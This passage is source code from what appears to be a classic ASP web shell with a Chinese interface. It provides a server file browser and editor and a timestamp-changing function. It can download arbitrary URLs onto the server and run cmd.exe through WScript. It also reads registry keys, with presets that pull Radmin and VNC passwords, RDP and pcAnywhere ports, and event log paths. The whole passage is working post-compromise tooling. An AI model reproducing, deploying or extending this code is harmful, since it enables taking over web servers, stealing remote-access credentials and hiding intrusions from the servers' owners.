		 Else
			If InStr("$rar$mdb$zip$exe$com$ico$", "$" & fileExt & "$") > 0 Then
				Response.AddHeader "Content-Disposition", "Attachment; Filename=" & Mid(sUrlB, InStrRev(sUrlB, "/") + 1)
				Response.BinaryWrite Http.ResponseBody
				Response.Flush
			 Else
				getHTTPPage = bytesToBSTR(Http.ResponseBody, "GB2312")
			End If
		End If

		Set Http = Nothing
	End Function

	Function bytesToBSTR(body,Cset)
		Dim objstream
		Set objstream = Server.CreateObject("adodb.stream")
		objstream.Type = 1
		objstream.Mode =3
		objstream.Open
		objstream.Write body
		objstream.Position = 0
		objstream.Type = 2
		objstream.Charset = Cset
		bytesToBSTR = objstream.ReadText 
		objstream.Close
		Set objstream = nothing
	End Function

	Sub PageApp()
		Server.ScriptTimeout = 600
		ShowTitle("Shell.Application与Stream组件文件浏览操作器")
		Select Case theAct
			Case "newone"
				sUrlB = GetPost("truePath") & GetPost("Param")
				sUrlB = Left(sUrlB, Len(sUrlB) - 1)
				StreamSaveToFile(sUrlB)
			Case "rename"
				AppSetProperties("Name")
			Case "download"
				DownTheFile()
				Response.End()
			Case "showimage"
				ShowImage()
				Response.End()
			Case "showedit"
				StreamShowEdit()
				Response.End()
			Case "save"
				StreamSaveToFile("")
				StreamShowEdit()
				Response.End()
			Case "saveas"
				AppSaveAs("Copy")
			Case "move"
				AppSaveAs("Move")
			Case "lastmodify"
				AppSetProperties("LM")
		End Select
		
		AppFileExplorer()
	End Sub
	
	Sub AppFileExplorer()
		Dim sPath, oFolder, sFather, sFolderId, oMember, sFolderList, sFileList, sFileName, sFilePath, sExtName
		If thePath = "" Then thePath = rootPath
		Set oFolder = oShl.NameSpace(thePath)
		sFather = GetParentPath(thePath)

		Echo "<form method=post action='" & url & "'>"
		Echo "<input type=hidden name=theAct>"
		Echo "<input type=hidden name=param>"
		Echo "<input type=hidden value=PageApp name=PageName id=PageName />"
		Echo Replace(sHeader, "{$s}", "APP文件浏览操作器")
		Echo "<td colspan=2>&nbsp;"
		Echo "路径: <input style='width:500px;' name=thePath value=""" & HtmlEncode(thePath) & """>"
		Echo "<input type=hidden name=truePath value=""" & HtmlEncode(thePath) & "\"">"
		Echo " <input type=button value='提交' onclick=Command('submit');>"
		Echo " <input type=button value=上传 onclick=Command('upload')>"
		Echo " <input type=button value=新文件 onclick=Command('newone','')>"
		Echo " <a href=""javascript:changeThePath(&#34;" & Replace(rootPath, "\", "\\") & "&#34;);"">站点根</a>"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
		Echo "<tr><td valign=top colspan=2>"
		Echo "<table width='99%' align=center>"
		Echo "<tr><td colspan=4 class=trHead>&nbsp;</td></tr><tr class=td><td>"

		If sFather <> "" Then
			If Left(sFather, 2) = "::" Then sFather = Left(sFather, Len(sFather) - 1)
			sFolderId = Replace(sFather, "\", "\\")
			Echo "&nbsp;<a href=""javascript:changeThePath(&#34;" & sFolderId & "&#34;);"">↑回上级目录</a>"
		End If
		Echo "</td><td align=center width=80>大小</td>"
		Echo "<td align=center width=140>最后修改</td><td align=center>操作</td></tr>"

		For Each oMember In oFolder.Items
			If oMember.IsFolder = True Then
				If Left(oMember.Path, 2) = "::" Then sPath = oMember.Path Else sPath = oMember.Path & "\"
				sFolderId = Replace(sPath, "\", "\\")
				sFolderList = sFolderList & "<tr title=""" & oMember.Name & """><td>&nbsp;<font color=CCCCFF>■</font>"
				sFolderList = sFolderList & "<span class=fixSpan style='width:180;'><a href=""javascript:changeThePath(&#34;" & sFolderId & "&#34;);"">" & oMember.Name & "</a></td>"
				sFolderList = sFolderList & "<td align=center>-</td><td align=center>" & oFolder.GetDetailsOf(oMember, 3) & "</td><td>"
				sFolderList = sFolderList & "<input type=button onclick=""Command('rename',&#34;" & oMember.Name & "&#34;);"" value='Ren' title=重命名>"
'				sFolderList = sFolderList & "<input type=button value='Move' title=移动 onclick=""Command('move',&#34;" & Replace(oMember.Path, "\", "\\") & "&#34;)"">"
'				sFolderList = sFolderList & "<input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&#34;" & Replace(oMember.Path, "\", "\\") & "&#34;)"">"
				sFolderList = sFolderList & "<input type=button value='LM' title=最后修改时间 onclick=""Command('lastmodify',&#34;" & oMember.Name & "*" & oFolder.GetDetailsOf(oMember, 3) & "&#34;)"">"
				sFolderList = sFolderList & "</td></tr>"
			Else
				sFilePath = oMember.Path
				sFileName = Mid(sFilePath, InStrRev(sFilePath, "\") + 1)
				sExtName = LCase(Mid(sFileName, InStrRev(sFileName, ".") + 1))
				If InStr(sFilePath, rootPath) > 0 Then
					sFolderId = Replace(Replace(Replace(UrlEncode(Mid(sFilePath, Len(rootPath) + 1)), "%2E", "."), "%5C", "/"), "+", "%20")
				Else
					sFolderId = "javascript:;"
				End If
				sFileList = sFileList & "<tr title=""" & sFileName & """><td>&nbsp;<font color=CCCCFF>□</font>"
				sFileList = sFileList & "<span class=fixSpan style='width:180;'><a href=""" & sFolderId & """" & IIf(sFolderId = "javascript:;", "", "target='_blank'") & ">" & sFileName & "</a></td>"
				sFileList = sFileList & "<td align=center>" & oFolder.GetDetailsOf(oMember, 1) & "</td><td align=center>" & oFolder.GetDetailsOf(oMember, 3) & "</td><td>"

				If InStr(editableFileExt, "$" & sExtName & "$") > 0 Then
					sFileList = sFileList & "<input type=button value='Edit' title=编辑 onclick=""Command('showedit',&#34;" & sFileName & "&#34;);"">"
				End If
				If InStr(imageFileExt, "$" & sExtName & "$") > 0 Then
					sFileList = sFileList & "<input type=button value='View' title=查看图片 onclick=""Command('showimage',&#34;" & sFileName & "&#34;);"">"
				End If
				If sExtName = "mdb" Then
					sFileList = sFileList & "<input type=button value='Access' title=数据库操作 onclick=Command('access',""" & sFileName & """)>"
				End If
				sFileList = sFileList & "<input type=button value='D' title=下载 onclick=""Command('download',&#34;" & sFileName & "&#34;)"">"
				sFileList = sFileList & "<input type=button value='Ren' title=重命名 onclick=""Command('rename',&#34;" & sFileName & "*" & oMember.Name & "&#34;)"">"
'				sFileList = sFileList & "<input type=button value='S' title=另存为 onclick=""Command('saveas',&#34;" & Replace(oMember.Path, "\", "\\") & "&#34;)"">"
				sFileList = sFileList & "<input type=button value='LM' title=最后修改时间 onclick=""Command('lastmodify',&#34;" & sFileName & "*" & oFolder.GetDetailsOf(oMember, 3) & "&#34;)"">"
'				sFileList = sFileList & "<input type=button value='M' title=移动 onclick=""Command('move',&#34;" & Replace(oMember.Path, "\", "\\") & "&#34;)"">"
				sFileList = sFileList & "</td></tr>"
			End If
		Next
		
		Echo sFolderList & sFileList
		Echo Replace(sFooter, "=2", "=4")
		Echo "</form>"
		
		Set oFolder = Nothing
	End Sub
	
	Function GetParentPath(sPath)
		Dim sFather
		If Right(sPath, 1) = "\" Then sFather = Left(sPath, Len(sPath) - 1) Else sFather = sPath
		If Len(sFather) = 2 Then
			GetParentPath = " "
		 Else
			GetParentPath = Left(sFather, InStrRev(sFather, "\"))
		End If
	End Function
	
	Function StreamSaveToFile(sPath)
		Dim oStream, sFileContent
		If isDebugMode = False Then On Error Resume Next
		If sPath = "" Then sPath = GetPost("truePath")
		sFileContent = GetPost("fileContent")

		Set oStream = Server.CreateObject("adodb.stream")
		With oStream
			.Type=2
			.Mode=3
			.Open
			ChkErr(Err)
			.Charset="gb2312"
			.WriteText sFileContent
			.saveToFile sPath, 2
			.Close
		End With
		Set oStream = Nothing
	End Function
	
	Sub StreamShowEdit()
		Dim sPath, sFileContent
		If isDebugMode = False Then On Error Resume Next
		sPath = GetPost("truePath") & GetPost("param")
		sFileContent = StreamLoadFromFile(sPath)
		ChkErr(Err)

		Echo "<form method=post action='" & url & "'>"
		Echo Replace(Replace(sHeader, "{$s}", "Stream文本编辑器"), "=2", "=1")
		Echo "<input type=hidden name=theAct>"
		Echo "<input type=hidden value=PageApp name=PageName>"
		Echo "<tr>"
		Echo "<td height=22>&nbsp;<input name=truePath value=""" & sPath & """ style=width:500px;>"
		Echo "<input type=submit value=查看 onClick=this.form.theAct.value='showedit';></td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;<textarea name=fileContent style='width:735px;height:500px;'>"
		Echo HtmlEncode(sFileContent)
		Echo "</textarea></td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=trHead>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=td align=center><input type=button name=Submit value=保存 onClick=""if(confirm('确认保存修改?')){this.form.theAct.value='save';this.form.submit();}"">"
		Echo "<input type=reset value=重置><input type=button onclick='window.close();' value=关闭>"
		Echo "<input type=button value=预览 onclick=preView('1'); title='以HTML方式在新窗口中预览当前代码'></td>"
		Echo "</tr>"
		Echo "</form>"
		Echo "</table>"
	End Sub
	
	Sub AppSaveAs(sFlag)
		Dim aParam, oTarFolder, sFileName, sFather
		If isDebugMode = False Then On Error Resume Next
		aParam = Split(GetPost("param"), ",")
		sFather = aParam(1)
		If Right(sFather, 1) = "\" And Len(sFather) > 3 Then
			sFather = Left(sFather, Len(sFather) - 1)
		Else
			sFather = GetParentPath(sFather)
			If Len(sFather) > 3 Then sFather = Left(sFather, Len(sFather) - 1)
		End If
		If Right(aParam(0), 1) = "\" And Len(aParam(0)) > 3 Then aParam(0) = Left(aParam(0), Len(aParam(0)) - 1)

		Set oTarFolder = oShl.NameSpace(sFather)
		If sFlag = "Copy" Then oTarFolder.CopyHere(aParam(0))
		If sFlag = "Move" Then oTarFolder.MoveHere(aParam(0))
		ChkErr(Err)
	End Sub
	
	Sub AppSetProperties(sFlag)
		Dim oItem, sPath, aParam, oFolder
		If isDebugMode = False Then On Error Resume Next
		aParam = Split(GetPost("param"), ",")
		sPath = GetPost("truePath")
		If Right(sPath, 1) = "\" And Len(sPath) > 3 Then sPath = Left(sPath, Len(sPath) - 1)

		Set oFolder = oShl.NameSpace(sPath)
		ChkErr(Err)

		Set oItem = oFolder.ParseName(aParam(0))
		ChkErr(Err)

		If aParam(1) <> "" Then
			If sFlag = "Name" Then oItem.Name = aParam(1)
			If sFlag = "LM" And IsDate(aParam(1)) Then oItem.ModifyDate = aParam(1)
			ChkErr(Err)
		End If
		
		Set oItem = Nothing
		Set oFolder = Nothing
	End Sub

	Sub PageOtherTools()
		Dim theAct
		theAct = Request("theAct")

		ShowTitle("一些零碎的小东西")

		If theAct <> "" Then Response.Clear
		Select Case theAct
			Case "DownFromUrl"
				DownFromUrl()
			Case "ReadReg"
				Response.Write("<style>body{font-size:12px;}</style>" & vbNewLine)
				ReadReg()
			Case "ReadRegX"
				Response.Write("<style>body{font-size:12px;}</style>" & vbNewLine)
				ReadRegX()
			Case "FileCombiner"
				If InStr(thePath, ":") <= 0 Then thePath = Server.MapPath(thePath)
				FileCombiner(thePath)
				AlertThenClose("文件合并操作完成!")
		End Select
		If theAct <> "" Then Response.End()

		Echo "<form method=post action='' target=_blank>"
		Echo Replace(sHeader, "{$s}", "文件组合工具(程序不检查文件存在性)")
		Echo "<tr><td colspan=2>&nbsp;<input size=80 name=thePath value=""F:\Tools\FileName_Blocks\FileName_5(最后一个文件的相对路径或者绝对路径)""/>"
		Echo "<input type=hidden value=FileCombiner name=theAct>"
		Echo "<input type=hidden value=PageOtherTools name=PageName>"
		Echo "<input type=submit value='组 合'></td></tr>"
		Echo sFooter
		Echo "</form>"

		Echo "<form method=post target=_blank>"
		Echo "<input type=hidden value=PageOtherTools name=PageName>"
		Echo Replace(sHeader, "{$s}", "下载到服务器")
		Echo "<tr><td colspan=2>&nbsp;<input name=theUrl value='http://' size=80><input type=submit value='下 载'></td></tr>"
		Echo "<tr><td colspan=2>&nbsp;<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		Echo "<input type=checkbox name=overWrite value=2>存在覆盖</td></tr>"
		Echo "<input type=hidden value=DownFromUrl name=theAct>"
		Echo sFooter
		Echo "</form>"
		
		Echo "<form method=post action='' target=_blank>"
		Echo Replace(sHeader, "{$s}", "文件编辑")
		Echo "<tr><td colspan=2>&nbsp;<input size=80 name=truePath value=""" & HtmlEncode(Request.ServerVariables("PATH_TRANSLATED")) & """>"
		Echo "<input type=hidden value=showedit name=theAct>"
		Echo "<select name=PageName><option value=PageApp>用Stream</option><option value=PageFso>用FSO</option></select>"
		Echo "<input type=submit value='打 开'></td></tr>"
		Echo sFooter
		Echo "</form>"
		
		Echo "<form method=post target=_blank>"
		Echo Replace(sHeader, "{$s}", "注册表键值读取")
		Echo "<input type=hidden value=PageOtherTools name=PageName>"
		Echo "<input type=hidden value=ReadReg name=theAct>"
		Echo "<tr><td colspan=2>&nbsp;"
        Echo "<select onChange='this.form.thePath.value=this.value;'>"
		Echo "<option value=''>选择自带</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots\/'>WebPath</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter'>RadminPass</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Port'>RadminPort</option>"
		Echo "<option value='HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'>VNC3Pass</option>"
		Echo "<option value='HKEY_CURRENT_USER\Software\ORL\WinVNC3\PortNumber'>VNC3Port</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password'>VNC4Pass</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\PortNumber'>VNC4Port</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\Wds\Repwd\Tds\Tcp\PortNumber'>TerminalPort</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber'>TerminalPort</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort'>PcAnyWhereDataPort</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort'>PcAnyWhereStatusPort</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Application\File'>Application Log</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Security\File'>Security Log</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\System\File'>System Log</option>"
		Echo "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>"
		Echo "</select><br />"
		Echo "&nbsp;<input name=thePath value='' size=80>"
		Echo "<input type=button value='读 键' onclick=""this.form.theAct.value='ReadRegX';this.form.submit();"">"
		Echo "<input type=button value='读键值' onclick=""this.form.theAct.value='ReadReg';this.form.submit();"">"
		Echo "</td></tr>"
		Echo sFooter
		Echo "</form>"
	End Sub
	
	Sub DownFromUrl()
		If isDebugMode = False Then On Error Resume Next
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("Adodb.Stream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite <> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then 
			Exit Sub
		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		ChkErr(Err)
		
		AlertThenClose("文件 " & Replace(thePath, "\", "\\") & " 下载成功!")
		
		Set Http = Nothing
		Set Stream = Nothing
	End Sub

	Sub FileCombiner(sFilePath)
		If isDebugMode = False Then On Error Resume Next
		Dim sFolder, sFileName, iFileCount, oStream, oStreamB
		Set oStream = Server.CreateObject("Adodb.Stream")
		Set oStreamB = Server.CreateObject("Adodb.Stream")
		sFileName = Mid(sFilePath, InStrRev(sFilePath, "\") + 1)
		sFolder = Left(sFilePath, InStrRev(sFilePath, "\"))
		iFileCount = Mid(sFileName, InStrRev(sFileName, "_") + 1)
		sFileName = Left(sFileName, InStrRev(sFileName, "_") - 1)
		oStream.Type = 1
		oStream.Mode = 3
		oStream.Open
		oStreamB.Open
		oStreamB.Type = 1
		For i = 1 To iFileCount
			oStreamB.LoadFromFile(sFolder & "\" & sFileName & "_" & i)
			oStream.Write oStreamB.Read()
		Next
		oStream.SaveToFile sFolder & "\" & sFileName, 2
		oStream.Close
		oStreamB.Close
		Set oStream = Nothing
		Set oStream = Nothing
	End Sub

	Sub ReadReg()
		If isDebugMode = False Then On Error Resume Next
		Dim i, thePath, theArray
		thePath = Request("thePath")
		theArray = oWshl.RegRead(thePath)
		If IsArray(theArray) Then
			For i = 0 To UBound(theArray)
				Echo "<li>" & theArray(i)
			Next
		 Else
			Echo "<li>" & theArray
		End If
		ChkErr(Err)
	End Sub
	
	Sub ReadRegX()
		Dim sCmd, sResult
		If isDebugMode = False Then On Error Resume Next
		sCmd = "RegEdit.exe /e """ & rootPath & "\ReadRegX"" """ & thePath & """"
		oWshl.Run sCmd, 0, True
		sResult = oWshl.Exec("cmd.exe /c type " & rootPath & "\ReadRegX").StdOut.ReadAll()
		Echo StrEncode(sResult)
		sResult = oWshl.Exec("cmd.exe /c del " & rootPath & "\ReadRegX").StdOut.ReadAll()
		Echo "<br />" & sResult
	End Sub

	Function DBDownTheFile(oValue)
		Response.Clear
		Response.AddHeader "Content-Disposition", "Attachment; Filename=UnKnown.UnKnown"
		Response.AddHeader "Content-Length", LenB(oValue)
		Response.Charset = "UTF-8"
		Response.ContentType = "Application/Octet-Stream"
		Response.BinaryWrite oValue
		Response.Flush
	End Function

	Sub PageOther()
%>
<style id=theStyle>
BODY {
	FONT-SIZE: 9pt;
	COLOR: #000000;
	background-color: #ffffff;
	FONT-FAMILY: "Courier New";
	scrollbar-face-color:#E4E4F3;
	scrollbar-highlight-color:#FFFFFF;
	scrollbar-3dlight-color:#E4E4F3;
	scrollbar-darkshadow-color:#9C9CD3;
	scrollbar-shadow-color:#E4E4F3;
	scrollbar-arrow-color:#4444B3;
	scrollbar-track-color:#EFEFEF;
}
TABLE {
	FONT-SIZE: 9pt;
	FONT-FAMILY: "Courier New";
	BORDER-COLLAPSE: collapse;
	border-width: 1px;
	border-top-style: solid;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: solid;
	border-color: #d8d8f0;
}
.tr {
	font-family: "Courier New";
	font-size: 9pt;
	background-color: #e4e4f3;
	text-align: center;
}
.td {
	height: 24px;
	font-size: 9pt;
	background-color: #f9f9fd;
	font-family: "Courier New";
}
input {
	font-family: "Courier New";
	BORDER-TOP-WIDTH: 1px;
	BORDER-LEFT-WIDTH: 1px;
	FONT-SIZE: 12px;
	BORDER-BOTTOM-WIDTH: 1px;
	BORDER-RIGHT-WIDTH: 1px;
	color: #000000;
}
textarea {
	font-family: "Courier New";
	BORDER-WIDTH: 1px;
	FONT-SIZE: 12px;
	color: #000000;
}
A:visited {
	FONT-SIZE: 9pt; 
	COLOR: #333333; 
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
A:active {
	FONT-SIZE: 9pt; 
	COLOR: #3366cc; 
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
A:link {
	FONT-SIZE: 9pt; 
	COLOR: #000000;
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
A:hover {
	FONT-SIZE: 9pt; 
	COLOR: #3366cc; 
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
tr {
	font-family: "Courier New";
	font-size: 9pt;
	line-height: 18px;
}
td {
	font-size: 9pt;
	font-family: "Courier New";
	border-width: 1px;
	border-top-style: none;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: none;
	border-color: #d8d8f0;
}
.trHead {
	font-family: "Courier New";
	height: 2px;
	background-color: #e4e4f3;
	line-height: 2px;
}

.fixSpan {
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	vertical-align: baseline;
}

.fixTable {
	word-break: break-all;
	word-wrap: break-word;
}

#fileList span{
	width: 120px;
	line-height: 23px;
	cursor: hand;
	overflow: hidden;
	padding-left: 5px;
	white-space: nowrap;
	text-overflow: ellipsis;
	vertical-align: baseline;
	border: 1px solid #ffffff;
}
</style>
<script language=javascript>
function wsLoadIFrame(){
	cmdResult.document.body.innerHTML = "<form name=frm method=post action=\"?\"><input type=hidden name=PageName value=PageSaCmdRun /><input type=hidden name='theAct' value='readResult' /></form>";
	cmdResult.document.frm.submit();
}

function locate(str){
	var frm = document.forms[1];
	frm.theAct.value = str;
	frm.TheObj.value = '';
	frm.submit();
}

function checkAllBox(obj){
	var frm = document.forms[1];
	for(var i = 0; i < frm.elements.length; i++)
		if(frm.elements[i].id != 'checkAll' && frm.elements[i].type == 'checkbox')
			frm.elements[i].checked = obj.checked;
}

function changeThePath(str){
	var frm = document.forms[1];
	frm.theAct.value = '';
	frm.thePath.value = str;
	frm.submit();
}

function GetPageList(iPage, iCount, iPageCount, iListSize, sLinks)
{
	var iCurrPage
	if(iPageCount <= 1) return false;
	if(iPage > iPageCount) iPage = iPageCount;
	iCurrPage = Math.ceil(iPage / iListSize);
	
	document.write("<div align=\"left\">&nbsp;");
	document.write("共" + iCount + "条记录, " + iPageCount + "页&nbsp;");
	document.write("<a href=\"javascript:Command('Query','1');\"><font face=\"Webdings\">9</font></a>");

	if(iCurrPage > 1)
	{
		document.write("<a href=\"javascript:Command('Query','" + ((iCurrPage - 2) * iListSize + 1) + "');\"><font face=\"Webdings\">7</font></a>&nbsp;");
	}else{
		document.write("<font face=\"Webdings\">7</font>&nbsp;");
	}

	for(var i = (iCurrPage - 1) * iListSize + 1; i <= iCurrPage * iListSize; i++)
	{
		if(i > iPageCount) break;

		document.write("<a href=\"javascript:Command('Query','" + i + "');\">");

		if(i == iPage) document.write("<strong>" + i + "</strong>"); else document.write(i);

		document.write("</a>&nbsp;");
	}
	
	if(iCurrPage < Math.ceil(iPageCount / iListSize))
	{
		document.write("<a href=\"javascript:Command('Query','" + (iCurrPage * iListSize + 1) + "');\"><font face=\"Webdings\">8</font></a>");
	}else{
		document.write("<font face=\"Webdings\">8</font>");
	}
	
	document.write("<a href=\"javascript:Command('Query','" + iPageCount + "');\"><font face=\"Webdings\">:</font></a>");
	
	if(Math.ceil(iPageCount / iListSize) >= 2) document.write("&nbsp;<input id=\"page\" value=\"" + iPage + "\" style=\"width:24px;text-align:center;\" /><input type=\"button\" value=\"GO\" onclick=\"javascript:Command('Query',document.getElementById('page').value);\" />");
	
	document.write("&nbsp;</div>");
}

function Command(cmd, str){
	var j = 0;
	var strTmpB;
	var strTmp = str;
	var frm = document.forms[1];
	strTmpB = frm.PageName.value;
	if(str && str.indexOf("*") != -1)
	{
		str = str.split("*")[0];
		strTmp = strTmp.split("*")[1];
	}

	if(cmd == 'pack' || cmd == 'del'){
		for(var i = 0; i < frm.elements.length; i++)
			if(frm.elements[i].name != 'checkAll' && frm.elements[i].type == 'checkbox' && frm.elements[i].checked)
				j ++;
		if(j == 0)return;
	}

	if(cmd == 'rename' || cmd == 'saveas' || cmd == 'move'){
		frm.theAct.value = cmd;
		frm.param.value = str + ',';
		str = prompt('请输入新名称(位置)\n另存为和移动操作无法直接更改文件名.', strTmp);
		if(str && (strTmp != str)){
			frm.param.value += str;
		}else return;
	}
	
	if(cmd=='lastmodify'){
		frm.theAct.value = cmd;
		frm.param.value = str + ',';
		str = prompt('请输入新的"最后修改时间".', strTmp);
		if(!str || str == strTmp)return;
		frm.param.value+= str;
	}

	if(cmd == 'download'){
		frm.theAct.value = 'download';
		frm.param.value = str;
		if(!confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先更改文件的后缀名为sys,\n然后通过http协议直接下载.\n按\"确定\"用流来进行下载.'))
			return;
	}
	
	if(cmd == 'dbdownfile'){
		frm.theAct.value = 'dbdownfile';
		frm.param.value+= '!' + str;
		eval("frm." + str + "_Column.value=''");
		if(!confirm('文件大小未知,您确认要下载该文件吗,该操作可能导致远程服务器暂不可用.'))
			return;
	}

	if(cmd == 'submit'){
		frm.theAct.value = '';
	}

	if(cmd == 'del'){
		if(confirm('您确认要删除选中的 ' + j + ' 个文件(夹)吗?')){
			frm.theAct.value = 'del';
		}else return;
	}

	if(cmd == 'newone')
		if(strTmp = prompt('请输入要新建的文件(夹)名\nApp文件浏览操作器只能新建文件', '')){
			frm.theAct.value = 'newone';
			frm.param.value = strTmp + ',' + str;
		}else return;

	if(cmd == 'move' || cmd == 'copy'){
		frm.theAct.value = cmd;
	}

	if(cmd == 'showedit' || cmd == 'showimage'){
		frm.theAct.value = cmd;
		frm.param.value = str;
		frm.target = '_blank';
	}

	if(cmd == 'Query'){
		if(str == '0'){
			str = 1;
		}else{
			frm.reset();
		}
		frm.theAct.value = cmd;
		frm.param.value = str;
	}

	if(cmd == 'access'){
		frm.theAct.value = 'ShowTables';
		strTmp = frm.PageName.value;
		frm.PageName.value = 'PageDBTool';
		frm.thePath.value = frm.truePath.value + '\\' + str;
		frm.target = '_blank';
	}

	if(cmd == 'upload'){
		frm.PageName.value = 'PageUpload';
		frm.thePath.value = frm.truePath.value;
		frm.target = '_blank';
	}

	if(cmd == 'pack'){
		if(confirm('您确认要打包选中的 ' + j + ' 个项目吗?')){
			frm.PageName.value = 'PagePack';
			frm.theAct.value = 'PackOne';
			frm.target = '_blank';
		}else return;
	}

	frm.submit();
	frm.target = '';
	frm.PageName.value = strTmpB;
	frm.reset();
}

function showSqlEdit(column, str){
	var frm = document.forms[1];
	if(!str)return;
	frm.reset();
	frm.theAct.value = 'edit';
	frm.param.value = column + '!' + str;
	frm.target = '_blank';
	frm.submit();
	frm.target = '';
}

function sqlDelete(column, str){
	var frm = document.forms[1];
	if(!str)return;
	if(!confirm('确认要删除这条记录?'))return;
	frm.reset();
	frm.theAct.value = 'del';
	frm.param.value = column + '!' + str;
	frm.target = '_blank';
	frm.submit();
	frm.target = '';
}
function preView(n){
	var url, win;
	if(n != '1'){
		url = document.forms[1].truePath.value
		window.open('/' + escape(url));
	}else{
		win = window.open("about:blank", "", "resizable=yes,scrollbars=yes");
		win.document.write('<style>body{border:none;}</style>' + document.forms[1].fileContent.innerText);
	}
}
</script>
<%
	End Sub
%>